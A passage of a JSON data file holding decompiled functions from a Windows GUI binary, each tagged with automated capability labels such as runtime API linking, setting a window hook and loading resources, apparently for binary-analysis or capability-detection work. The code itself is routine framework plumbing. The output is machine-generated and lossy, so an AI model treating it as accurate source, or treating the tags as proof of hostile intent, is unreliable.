        "decompiled_code": "\nint32_t fcn.00419e36(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x00419eaf;\n    iVar3 = fcn.00419ed2();\n    if ((iVar3 == 0) && (iVar3 = fcn.00406948(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar4 = iVar3;\n        iVar5 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar4 = iVar3,  iVar5 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x00419eaf:\n            uVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar4 = iVar3;\n            iVar5 = iVar3;\n            if ((uVar6 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar4,  iVar1 != 0) {\n        iVar4 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar5);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar4 == 0)) || (iVar3 == iVar5))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 484
    },
    "00419f76": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419f76(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    for (; iVar2 != 0; iVar2 = fcn.004175ec(iVar2)) {\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    for (iVar2 = (*_sym.imp.USER32.dll_GetFocus)(); iVar2 != 0; iVar2 = fcn.004175ec(iVar2)) {\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) {\n            return;\n        }\n    }\n    iVar2 = fcn.00417631();\n    if (iVar2 == 0) {\n        uVar4 = 0;\n    }\n    else {\n        uVar4 = *(iVar2 + 0x1c);\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetLastActivePopup)(uVar4);\n    while( true ) {\n        if (iVar2 == 0) {\n            (*pcVar1)(*(unaff_EBX + 0x1c), 0x111, 0xe147, 0);\n            return;\n        }\n        iVar3 = (*pcVar1)(iVar2, 0x365, 0, 0);\n        if (iVar3 != 0) break;\n        iVar2 = fcn.004175ec(iVar2);\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "0041aed7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041aed7(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *param_1;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    if (iVar3 == param_2) {\n        *param_1 = *(param_1[1] + param_2);\n    }\n    else {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar1 = param_1[1];\n        do {\n            iVar2 = *(iVar1 + iVar3);\n            if (iVar2 == param_2) break;\n            iVar3 = iVar2;\n        } while (iVar2 != 0);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        *(iVar1 + iVar3) = *(iVar1 + param_2);\n    }\n    return 1;\n}\n",
        "token_count": 222
    },
    "0041b0fa": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b0fa(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    for (iVar2 = *(in_ECX + 0x14); iVar2 != 0; iVar2 = *(iVar2 + 4)) {\n        if (arg_8h < *(iVar2 + 8)) {\n            puVar3 = *(*(iVar2 + 0xc) + arg_8h * 4);\n            if (puVar3 != NULL) {\n                (***puVar3)(1);\n            }\n            *(*(iVar2 + 0xc) + arg_8h * 4) = 0;\n        }\n    }\n    puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n    *puVar1 = *puVar1 & 0xfffffffe;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    return;\n}\n",
        "token_count": 267
    },
    "0040696c": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.0040696c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if (*0x42f848 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((((iVar2 != 0) && (*0x42f830 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x41e040),  *0x42f830 != 0))\n            && (*0x42f834 = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x42f834 != 0)) &&\n           (((*0x42f838 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x42f838 != 0 &&\n             (*0x42f83c = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x42f83c != 0)) &&\n            ((*0x42f844 = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x42f844 != 0 &&\n             (*0x42f840 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x42f840 != 0)))))) {\n            *0x42f848 = 1;\n            return true;\n        }\n        *0x42f830 = 0;\n        *0x42f834 = 0;\n        *0x42f838 = 0;\n        *0x42f83c = 0;\n        *0x42f840 = 0;\n        *0x42f844 = 0;\n        *0x42f848 = 1;\n        bVar3 = false;\n    }\n    else {\n        bVar3 = *0x42f840 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 431
    },
    "0041834e": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0041834e(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t unaff_ESI;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"InitCommonControlsEx\");\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 333
    },
    "0040eb40": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0040eb40(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    *0x43062c = param_2;\n    *0x430624 = param_1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *0x430628 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(4, 0x40ea90, *0x4319fc, uVar1);\n    return;\n}\n",
        "token_count": 111
    },
    "0041a8af": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041a8af(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable._AFX_THREAD_STATE.0;\n    piVar1 = extraout_ECX[0x33];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x58))();\n        if (extraout_ECX[0x33] != NULL) {\n            (**(*extraout_ECX[0x33] + 4))(1);\n        }\n    }\n    pcVar2 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (extraout_ECX[0xc] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(extraout_ECX[0xc]);\n    }\n    if (extraout_ECX[0xb] != NULL) {\n        (*pcVar2)(extraout_ECX[0xb]);\n    }\n    if (extraout_ECX[3] != NULL) {\n        fcn.0040795e(extraout_ECX[3]);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 373
    },
    "00418031": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.00418031(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    if (param_1 != 0) {\n        iVar2 = fcn.0041ab50();\n        uVar1 = *(iVar2 + 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, param_1, 0xf0);\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar2);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2);\n        }\n    }\n    uVar3 = fcn.00418081(uVar3);\n    return uVar3;\n}\n",
        "token_count": 204
    }
}